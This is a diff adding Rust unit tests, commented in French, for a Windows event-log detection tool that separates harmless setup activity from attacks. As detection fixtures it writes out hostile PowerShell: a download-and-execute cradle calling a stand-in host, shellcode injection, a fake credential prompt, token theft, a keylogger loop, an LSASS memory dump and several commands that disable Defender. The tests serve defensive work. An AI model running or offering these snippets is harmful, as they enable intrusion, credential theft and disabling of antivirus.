@@ -75,6 +75,7 @@ fn options() -> Options {
     Options {
         depuis: None,
         defender_antivirus: Some(true),
+        installation: None,
     }
 }
 
@@ -1235,6 +1236,8 @@ fn abonnement_wmi_permanent() {
     };
     let js = juger(&[
         du_xml(&x("CommandLineEventConsumer=\"Mise a jour\"")),
+        du_xml(&x("SMTPEventConsumer=\"Rapport\"")),
+        // Celui que Windows pose lui-même : rien à dire (`abonnement_wmi_de_windows_lui_meme`).
         du_xml(&x("NTEventLogEventConsumer=\"SCM Event Log Consumer\"")),
     ]);
     let mut g = gravites(&js, "EVT-WMI-001");
@@ -2221,4 +2224,555 @@ fn defender_et_comptes_apres_relecture() {
     let mut g = gravites(&js, "EVT-IDE-001");
     g.sort();
     assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
+}
+
+// ---------------------------------------------------------------------------------------------------------------
+// Un Windows tout juste installé : ce qu'écrivent la mise en route, ses modules et son serveur SSH, sans alerte ; et
+// les attaques qui leur ressemblent, toujours en alerte
+// ---------------------------------------------------------------------------------------------------------------
+
+/// Un bloc de script de PowerShell 5.1, du niveau donné, avec ou sans fichier.
+fn bloc_ps(s: i64, texte: &str, chemin: &str, niveau: u8) -> EvenementWindows {
+    let mut e = ev(
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-PowerShell",
+        4104,
+        s,
+        &[
+            ("MessageNumber", "1"),
+            ("MessageTotal", "1"),
+            ("ScriptBlockText", texte),
+            ("ScriptBlockId", "{1}"),
+            ("Path", chemin),
+        ],
+    );
+    e.niveau = Some(niveau);
+    e
+}
+
+#[test]
+fn avertissements_de_powershell_sans_motif_regroupes() {
+    let mut evs = Vec::new();
+    // Comme les modules CDXML générés par Windows : chacun d'un texte différent, tous jugés suspects par PowerShell
+    // (« Methods », « Properties », « Marshal »…), aucun motif d'attaque.
+    for i in 0..300 {
+        evs.push(bloc_ps(
+            i,
+            &format!(
+                "#requires -version 3.0\ntry {{ Microsoft.PowerShell.Core\\Set-StrictMode -Off }} catch {{ }}\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n$__cmdletization_methodParameter{i} = [Microsoft.PowerShell.Cmdletization.MethodParameter]::new(); [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])"
+            ),
+            "",
+            3,
+        ));
+    }
+    // Un script d'installation lancé à la main, trois fois.
+    for i in 0..3 {
+        evs.push(bloc_ps(
+            400 + i,
+            "powershell -ExecutionPolicy Bypass -File \"E:\\activer.ps1\"",
+            r"E:\activer.ps1",
+            3,
+        ));
+    }
+    // De vraies attaques, elles aussi au niveau Avertissement : chacune reste une alerte, à part.
+    let attaques = [
+        (
+            "$c=New-Object Net.WebClient;IEX $c.DownloadString('http://x.test/a')",
+            "telecharge",
+        ),
+        (
+            "$m=[Kernel32]::VirtualAlloc(0,$sc.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length);[Kernel32]::CreateThread(0,0,$m,0,0,0)",
+            "memoire",
+        ),
+        (
+            "$f=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[D]);$a=$k::VirtualAlloc(0,4096,0x3000,0x40)",
+            "memoire",
+        ),
+        (
+            "$cred=$Host.ui.PromptForCredential('Windows Security','Please enter user credentials','','');while($DS.ValidateCredentials($u,$cred.GetNetworkCredential().password) -ne $True){}",
+            "hameconnage",
+        ),
+        (
+            "[W]::DuplicateTokenEx($h,0xf01ff,0,2,1,[ref]$d);[W]::CreateProcessWithTokenW($d,0,'cmd.exe',$null,0,0,$null,[ref]$si,[ref]$pi)",
+            "jeton",
+        ),
+        (
+            "while($true){for($k=8;$k -le 254;$k++){if([U]::GetAsyncKeyState($k) -eq -32767){[U]::GetKeyboardState($s);[U]::ToUnicode($k,0,$s,$b,$b.Capacity,0)}}}",
+            "clavier",
+        ),
+    ];
+    for (i, (texte, _)) in attaques.iter().enumerate() {
+        evs.push(bloc_ps(500 + i64::try_from(i).unwrap(), texte, "", 3));
+    }
+    let js = juger(&evs);
+    let t = trouvailles(&js, "EVT-PSH-001");
+    let sans = t.iter().find(|t| t.objet == "avertissement|sans-fichier").unwrap();
+    assert_eq!((sans.gravite, sans.nombre), (Gravite::Info, 300));
+    let fichier = t.iter().find(|t| t.objet == r"avertissement|e:\activer.ps1").unwrap();
+    assert_eq!((fichier.gravite, fichier.nombre), (Gravite::Info, 3));
+    for (texte, categorie) in attaques {
+        assert!(
+            t.iter()
+                .any(|t| t.objet.starts_with(&format!("{categorie}|")) && t.gravite >= Gravite::Alerte),
+            "{texte}"
+        );
+    }
+    // Deux lignes d'information, et une alerte par attaque (les deux chargeurs en mémoire sont deux blocs).
+    assert_eq!(t.iter().filter(|t| t.gravite == Gravite::Info).count(), 2, "{t:#?}");
+    assert_eq!(t.len(), 2 + attaques.len(), "{t:#?}");
+    // Le constat dit combien.
+    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
+    let m = &constats
+        .iter()
+        .find(|c| {
+            c.regle == "EVT-PSH-001" && (c.message.contains("aucun motif") || c.message.contains("no attack pattern"))
+        })
+        .unwrap()
+        .message;
+    assert!(m.contains("(300 "), "{m}");
+}
+
+#[test]
+fn motifs_d_attaque_ajoutes_et_leurs_sosies_d_administration() {
+    let cas = [
+        (
+            "$p=[W]::OpenProcess(0x1F0FFF,$false,$id);$m=[W]::VirtualAllocEx($p,0,$n,0x3000,0x40);[W]::WriteProcessMemory($p,$m,$sc,$n,[ref]0);[W]::CreateRemoteThread($p,0,0,$m,0,0,0)",
+            Some("memoire"),
+        ),
+        // Des outils d'administration ou de Windows : les mêmes noms d'API, sans le geste d'attaque.
+        (
+            "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow();' -Name W -Namespace U",
+            None,
+        ),
+        (
+            "$id=[Security.Principal.WindowsIdentity]::GetCurrent(); [W]::OpenProcessToken($h,8,[ref]$t)",
+            None,
+        ),
+        (
+            "$c = Get-Credential; New-PSDrive -Name S -PSProvider FileSystem -Root \\\\srv\\x -Credential $c; $c.GetNetworkCredential().UserName",
+            None,
+        ),
+        ("[System.Runtime.InteropServices.Marshal]::AllocHGlobal(16)", None),
+        ("if ([U]::GetAsyncKeyState(0x10)) { 'Maj' }", None),
+    ];
+    for (texte, attendu) in cas {
+        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
+    }
+}
+
+#[test]
+fn identifiants_de_la_mise_en_route_et_du_serveur_ssh() {
+    let par = |s, p: &str, compte: &str| {
+        sec(
+            4648,
+            s,
+            &[
+                ("SubjectUserSid", "S-1-5-18"),
+                ("ProcessName", p),
+                ("TargetUserName", compte),
+                ("TargetServerName", "localhost"),
+            ],
+        )
+    };
+    let js = juger(&[
+        par(0, r"C:\Windows\System32\oobe\UserOOBEBroker.exe", "alice@example.test"),
+        par(1, r"C:\Windows\System32\OpenSSH\sshd.exe", "sshd_4242"),
+        par(2, r"C:\Windows\System32\OpenSSH\sshd.exe", "alice"),
+        // Le même nom ailleurs : déguisé, ou d'un dossier où un compte ordinaire écrit.
+        par(3, r"C:\ProgramData\UserOOBEBroker.exe", "alice"),
+        par(4, r"C:\Users\alice\AppData\Local\Temp\UserOOBEBroker.exe", "alice"),
+        par(5, r"C:\Windows\oobe\UserOOBEBroker.exe", "alice"),
+        par(6, r"C:\Users\Public\sshd.exe", "alice"),
+        // Hors de Program Files, un sshd.exe est déguisé (même dans System32, hors du dossier d'OpenSSH).
+        par(8, r"C:\Windows\System32\sshd.exe", "alice"),
+        par(9, r"C:\Outils\sshd.exe", "alice"),
+        // OpenSSH de Microsoft installé à part (Program Files) : à savoir, pas déguisé.
+        par(7, r"C:\Program Files\OpenSSH\sshd.exe", "sshd_77"),
+    ]);
+    let mut v: Vec<(String, Gravite)> = trouvailles(&js, "EVT-IDE-001")
+        .iter()
+        .map(|t| (t.objet.split('|').next().unwrap().to_string(), t.gravite))
+        .collect();
+    v.sort();
+    assert_eq!(
+        v,
+        [
+            (r"c:\outils\sshd.exe".to_string(), Gravite::Alerte),
+            (r"c:\program files\openssh\sshd.exe".to_string(), Gravite::Info),
+            (r"c:\programdata\useroobebroker.exe".to_string(), Gravite::Alerte),
+            (
+                r"c:\users\alice\appdata\local\temp\useroobebroker.exe".to_string(),
+                Gravite::Alerte
+            ),
+            (r"c:\users\public\sshd.exe".to_string(), Gravite::Alerte),
+            (r"c:\windows\oobe\useroobebroker.exe".to_string(), Gravite::Alerte),
+            (r"c:\windows\system32\sshd.exe".to_string(), Gravite::Alerte),
+        ]
+    );
+}
+
+/// Le premier compte créé et mis administrateur par le compte de l'ordinateur, `s` secondes après `t0`.
+fn premier_compte(s: i64, auteur: &str) -> Vec<EvenementWindows> {
+    vec![
+        sec(
+            4720,
+            s,
+            &[
+                ("SubjectUserSid", auteur),
+                ("SubjectUserName", "POSTE-ALICE$"),
+                ("SubjectDomainName", "WORKGROUP"),
+                ("TargetUserName", "alice"),
+                ("TargetSid", "S-1-5-21-1-2-3-1001"),
+            ],
+        ),
+        sec(
+            4732,
+            s,
+            &[
+                ("SubjectUserSid", auteur),
+                ("SubjectUserName", "POSTE-ALICE$"),
+                ("SubjectDomainName", "WORKGROUP"),
+                ("MemberName", "-"),
+                ("MemberSid", "S-1-5-21-1-2-3-1001"),
+                ("TargetUserName", "Administrateurs"),
+                ("TargetSid", "S-1-5-32-544"),
+            ],
+        ),
+    ]
+}
+
+/// Une ouverture de session au clavier.
+fn session(s: i64, compte: &str, sid: &str) -> EvenementWindows {
+    sec(
+        4624,
+        s,
+        &[("LogonType", "2"), ("TargetUserName", compte), ("TargetUserSid", sid)],
+    )
+}
+
+fn adm(evs: &[EvenementWindows], installation: Option<DateTime<Utc>>) -> Vec<Trouvaille> {
+    let o = Options {
+        installation,
+        ..options()
+    };
+    let js = juger_avec(evs, &tout_lu(), o);
+    trouvailles(&js, "EVT-ADM-001").to_vec()
+}
+
+fn admin_ajoute(t: &[Trouvaille]) -> &Trouvaille {
+    t.iter()
+        .find(|t| t.objet == "groupe:s-1-5-32-544:s-1-5-21-1-2-3-1001")
+        .unwrap()
+}
+
+#[test]
+fn premier_administrateur_cree_pendant_la_mise_en_route() {
+    let installe = Some(t0());
+    // Trois heures après l'installation (le compte choisi plus tard), avant toute session : la mise en route.
+    let mut evs = premier_compte(3 * 3600, "S-1-5-18");
+    // Le compte temporaire de la mise en route a ouvert une session avant : il ne compte pas.
+    evs.push(session(600, "defaultuser0", "S-1-5-21-1-2-3-1000"));
+    // Le nouveau compte ouvre sa session tout de suite après.
+    evs.push(session(3 * 3600 + 20, "alice", "S-1-5-21-1-2-3-1001"));
+    let t = adm(&evs, installe);
+    let a = admin_ajoute(&t);
+    assert_eq!(a.gravite, Gravite::Info);
+    assert!(a.pourquoi.0.contains("pendant l'installation"), "{:?}", a.pourquoi);
+    assert!(a.reserves.is_empty());
+    let c = t.iter().find(|t| t.objet == "cree:alice").unwrap();
+    assert!(c.pourquoi.0.contains("pendant l'installation"), "{:?}", c.pourquoi);
+    // Le message le dit.
+    let mut js = juger_avec(
+        &evs,
+        &tout_lu(),
+        Options {
+            installation: installe,
+            ..options()
+        },
+    );
+    js.retain(|j| j.regle.id == "EVT-ADM-001");
+    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
+    assert!(
+        constats
+            .iter()
+            .any(|c| c.message.contains("pendant l'installation de Windows")
+                || c.message.contains("during Windows setup"))
+    );
+}
+
+#[test]
+fn premier_administrateur_hors_de_la_mise_en_route_reste_une_alerte() {
+    let installe = Some(t0());
+    // Un mois après l'installation : SYSTEM est aussi ce qu'obtient un attaquant.
+    let t = adm(&premier_compte(30 * 86_400, "S-1-5-18"), installe);
+    assert_eq!(admin_ajoute(&t).gravite, Gravite::Alerte);
+    assert!(admin_ajoute(&t).reserves.is_empty());
+    // Le jour même, mais après qu'une personne a ouvert sa session : la mise en route était finie.
+    let mut evs = premier_compte(2 * 3600, "S-1-5-18");
+    evs.push(session(3600, "bob", "S-1-5-21-1-2-3-1002"));
+    assert_eq!(admin_ajoute(&adm(&evs, installe)).gravite, Gravite::Alerte);
+    // Plus d'un jour avant la date d'installation (journal d'un autre Windows sur le même disque, horloge reculée).
+    assert_eq!(
+        admin_ajoute(&adm(&premier_compte(-2 * 86_400, "S-1-5-18"), installe)).gravite,
+        Gravite::Alerte
+    );
+    // Une heure avant : InstallDate récrite par les mises à jour du premier jour (vu sur un vrai Windows 11).
+    assert_eq!(
+        admin_ajoute(&adm(&premier_compte(-3600, "S-1-5-18"), installe)).gravite,
+        Gravite::Info
+    );
+    // Pendant l'installation, mais par un compte de personne (l'Administrateur intégré) : jamais la mise en route.
+    let t = adm(&premier_compte(600, "S-1-5-21-1-2-3-500"), installe);
+    assert_eq!(admin_ajoute(&t).gravite, Gravite::Alerte);
+    assert!(admin_ajoute(&t).reserves.is_empty());
+    // Pendant l'installation, par SYSTEM, mais aux utilisateurs du Bureau à distance : la mise en route ne le fait pas.
+    let bureau = sec(
+        4732,
+        600,
+        &[
+            ("SubjectUserSid", "S-1-5-18"),
+            ("MemberSid", "S-1-5-21-1-2-3-1001"),
+            ("TargetSid", "S-1-5-32-555"),
+        ],
+    );
+    let t = adm(&[bureau], installe);
+    assert_eq!(t[0].gravite, Gravite::Alerte);
+    // Un compte au nom en « $ » reste critique, même pendant l'installation.
+    let cache = sec(
+        4720,
+        600,
+        &[
+            ("SubjectUserSid", "S-1-5-18"),
+            ("TargetUserName", "aide$"),
+            ("TargetSid", "S-1-5-21-1-2-3-1005"),
+        ],
+    );
+    assert_eq!(adm(&[cache], installe)[0].gravite, Gravite::Critique);
+}
+
+#[test]
+fn premier_administrateur_sans_date_d_installation() {
+    // Un dossier rapporté, ou InstallDate illisible : l'alerte reste, avec ce qui l'explique peut-être.
+    let t = adm(&premier_compte(600, "S-1-5-18"), None);
+    let a = admin_ajoute(&t);
+    assert_eq!(a.gravite, Gravite::Alerte);
+    assert!(a.reserves.contains(&Reserve::MiseEnRoutePossible));
+    let js = juger_avec(&premier_compte(600, "S-1-5-18"), &tout_lu(), options());
+    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
+    assert!(
+        constats
+            .iter()
+            .any(|c| c.message.contains("mise en route") || c.message.contains("Windows setup"))
+    );
+    // Par un autre compte : pas de réserve, rien ne l'explique.
+    let t = adm(&premier_compte(600, "S-1-5-21-1-2-3-500"), None);
+    assert!(admin_ajoute(&t).reserves.is_empty());
+}
+
+#[test]
+fn module_de_defender_declare_sans_desarmer() {
+    // Le module ConfigDefender que Windows génère (CDXML) déclare les réglages qu'il sait changer : PowerShell le
+    // journalise dès qu'on s'en sert (Get-MpComputerStatus), sans que rien ne soit coupé.
+    let module = [
+        "    [Parameter(ParameterSetName='Set0')]\n    [Alias('drtm')]\n    [ValidateNotNull()]\n    [bool]\n    ${DisableRealtimeMonitoring},\n",
+        "        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\n",
+        "          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $__cmdletization_defaultValueIsPresent}",
+    ];
+    for texte in module {
+        assert_eq!(script_suspect(texte).map(|x| x.0), None, "{texte}");
+    }
+    // Les mêmes réglages employés pour couper Defender : toujours une alerte.
+    let coupe = [
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Set-MpPreference -DisableBehaviorMonitoring:1",
+        "Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name DisableRealtimeMonitoring -Value 1",
+        "New-ItemProperty -Path $k -Name 'DisableScriptScanning' -Value 1 -PropertyType DWord",
+        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1",
+        "Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Set -Arguments @{DisableRealtimeMonitoring=$true}",
+        "$p = Get-MpPreference; $p.DisableBlockAtFirstSeen = $true",
+        "[Microsoft.Win32.Registry]::SetValue('HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender', 'Disable'+'RealtimeMonitoring', 1)",
+    ];
+    for texte in coupe {
+        assert_eq!(script_suspect(texte).map(|x| x.0), Some("desarme"), "{texte}");
+    }
+}
+
+#[test]
+fn abonnement_wmi_de_windows_lui_meme() {
+    let wmi = |consommateur: &str| {
+        ev(
+            "Microsoft-Windows-WMI-Activity/Operational",
+            "Microsoft-Windows-WMI-Activity",
+            5861,
+            0,
+            &[
+                ("Namespace", "//./root/subscription"),
+                ("CONSUMER", consommateur),
+                (
+                    "PossibleCause",
+                    "Binding EventFilter: instance of __EventFilter { Name = \"SCM Event Log Filter\"; };",
+                ),
+            ],
+        )
+    };
+    let js = juger(&[
+        wmi("NTEventLogEventConsumer=\"SCM Event Log Consumer\""),
+        wmi("CommandLineEventConsumer=\"SCM Event Log Consumer\""),
+    ]);
+    // Seul le consommateur qui écrit au journal est celui de Windows ; un homonyme qui lance une commande reste critique.
+    assert_eq!(gravites(&js, "EVT-WMI-001"), [Gravite::Critique]);
+    // Le même ailleurs que dans root\subscription : pas celui de Windows.
+    let mut autre = wmi("NTEventLogEventConsumer=\"SCM Event Log Consumer\"");
+    autre.champs.retain(|(n, _)| n != "Namespace");
+    autre.champs.push(("Namespace".into(), "//./root/cimv2".into()));
+    assert_eq!(gravites(&juger(&[autre]), "EVT-WMI-001"), [Gravite::Info]);
+}
+
+#[test]
+fn hors_de_la_mise_en_route_la_raison_est_dite() {
+    let mut evs = premier_compte(2 * 3600, "S-1-5-18");
+    evs.push(session(3600, "bob", "S-1-5-21-1-2-3-1002"));
+    let t = adm(&evs, Some(t0()));
+    let a = admin_ajoute(&t);
+    assert_eq!(a.gravite, Gravite::Alerte);
+    let libelles: Vec<_> = a.details.iter().map(|(l, _)| *l).collect();
+    assert!(libelles.contains(&super::moteur::Libelle::Installation), "{libelles:?}");
+    assert!(
+        libelles.contains(&super::moteur::Libelle::PremiereSession),
+        "{libelles:?}"
+    );
+    // Un mois après, sans session : seulement la date d'installation.
+    let t = adm(&premier_compte(30 * 86_400, "S-1-5-18"), Some(t0()));
+    let libelles: Vec<_> = admin_ajoute(&t).details.iter().map(|(l, _)| *l).collect();
+    assert!(libelles.contains(&super::moteur::Libelle::Installation));
+    assert!(!libelles.contains(&super::moteur::Libelle::PremiereSession));
+}
+
+#[test]
+fn mise_en_route_seulement_si_tout_le_dit() {
+    let installe = Some(t0());
+    let admis = |evs: &[EvenementWindows], o: Options| {
+        let js = juger_avec(evs, &tout_lu(), o);
+        admin_ajoute(trouvailles(&js, "EVT-ADM-001")).gravite == Gravite::Info
+    };
+    let o = || Options {
+        installation: installe,
+        ..options()
+    };
+    assert!(admis(&premier_compte(600, "S-1-5-18"), o()));
+    // Le même ajout, une seconde fois par un autre compte : la trouvaille regroupée n'est plus la mise en route.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    evs.extend(premier_compte(700, "S-1-5-21-1-2-3-500"));
+    assert!(!admis(&evs, o()));
+    // Un des événements sans date : il ne se place pas.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    let mut sans_date = premier_compte(650, "S-1-5-18").remove(1);
+    sans_date.date = None;
+    evs.push(sans_date);
+    assert!(!admis(&evs, o()));
+    // Une session d'une personne sans date : peut-être avant.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    let mut s = session(0, "bob", "S-1-5-21-1-2-3-1002");
+    s.date = None;
+    evs.push(s);
+    assert!(!admis(&evs, o()));
+    // Une session d'un compte Entra ID avant : la mise en route était finie.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    evs.push(session(300, "bob@example.test", "S-1-12-1-1-2-3-4"));
+    assert!(!admis(&evs, o()));
+    // Un compte qui se fait appeler comme le compte temporaire, sans en avoir la forme : une session comme une autre.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    evs.push(session(300, "defaultuser_bob", "S-1-5-21-1-2-3-1003"));
+    assert!(!admis(&evs, o()));
+    // Une session sur un autre nom de l'ordinateur (renommé pendant la mise en route) compte aussi.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    let mut ailleurs = session(300, "bob", "S-1-5-21-1-2-3-1002");
+    ailleurs.ordinateur = "DESKTOP-ESSAI".into();
+    evs.push(ailleurs);
+    assert!(!admis(&evs, o()));
+    // Lu depuis une date plus récente que la fenêtre : les sessions d'avant n'ont pas été lues.
+    let recent = Options {
+        depuis: Some(t0() + Duration::hours(1)),
+        ..o()
+    };
+    assert!(!admis(&premier_compte(2 * 3600, "S-1-5-18"), recent));
+    // Un journal de sécurité qui commence bien avant l'installation dite : InstallDate récrite (un attaquant SYSTEM
+    // la met à aujourd'hui), ou un Windows installé depuis longtemps.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    evs.push(sec(
+        4624,
+        -10 * 86_400,
+        &[("LogonType", "5"), ("TargetUserName", "SYSTEM")],
+    ));
+    assert!(!admis(&evs, o()));
+    // Un journal de sécurité vidé (1102) : ce qui précédait a pu partir avec lui.
+    let mut evs = premier_compte(600, "S-1-5-18");
+    evs.push(ev(
+        "Security",
+        "Microsoft-Windows-Eventlog",
+        1102,
+        60,
+        &[("SubjectUserName", "x")],
+    ));
+    assert!(!admis(&evs, o()));
+}
+
+#[test]
+fn un_compte_cree_par_system_hors_de_la_mise_en_route_reste_sans_ajout() {
+    // Déjà une information (un outil d'administration crée des comptes) : ni date d'installation ni réserve ajoutées.
+    let cree = premier_compte(30 * 86_400, "S-1-5-18").remove(0);
+    let t = adm(std::slice::from_ref(&cree), Some(t0()));
+    assert_eq!(t[0].gravite, Gravite::Info);
+    assert!(
+        t[0].details
+            .iter()
+            .all(|(l, _)| *l != super::moteur::Libelle::Installation)
+    );
+    let t = adm(&[cree], None);
+    assert!(t[0].reserves.is_empty());
+}
+
+#[test]
+fn reglages_de_defender_employes_autrement() {
+    let coupe = [
+        "Set-ItemProperty $k DisableRealtimeMonitoring 1",
+        "Set-ItemProperty -Path $k -Name (\"Disable\"+\"RealtimeMonitoring\") -Value 1",
+        "$a=@{Path=$k;Name='DisableRealtimeMonitoring';Value=1}; Set-ItemProperty @a",
+        "$h=@{}; $h['DisableRealtimeMonitoring'] = $true; Set-MpPreference @h",
+        "$h.Add('DisableIOAVProtection', $true)",
+    ];
+    for texte in coupe {
+        assert_eq!(script_suspect(texte).map(|x| x.0), Some("desarme"), "{texte}");
+    }
+}
+
+#[test]
+fn le_regroupement_des_avertissements_ne_se_tait_pas() {
+    let js = juger(&[bloc_ps(0, "Add-Type -TypeDefinition $c", "", 3)]);
+    let t = &trouvailles(&js, "EVT-PSH-001")[0];
+    assert_eq!(t.objet, "avertissement|sans-fichier");
+    assert!(!resultat::taisable("EVT-PSH-001", t));
+    let (constats, _) = resultat::constats(&analyse(js), &|_| true);
+    assert!(
+        constats
+            .iter()
+            .any(|c| c.regle == "EVT-PSH-001" && c.probleme.is_some())
+    );
+}
+
+#[test]
+fn vidage_et_usurpation_sans_le_geste_complet() {
+    let cas = [
+        (
+            "$p=Get-Process -Id 624; [W]::MiniDumpWriteDump($p.Handle,$p.Id,$f.SafeFileHandle,2,0,0,0)",
+            Some("lsass"),
+        ),
+        (
+            "[W]::LogonUser($u,$d,$m,9,0,[ref]$t); [W]::ImpersonateLoggedOnUser($t); Get-ChildItem \\\\srv\\c$; [W]::RevertToSelf()",
+            Some("jeton"),
+        ),
+    ];
+    for (texte, attendu) in cas {
+        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
+    }
 }
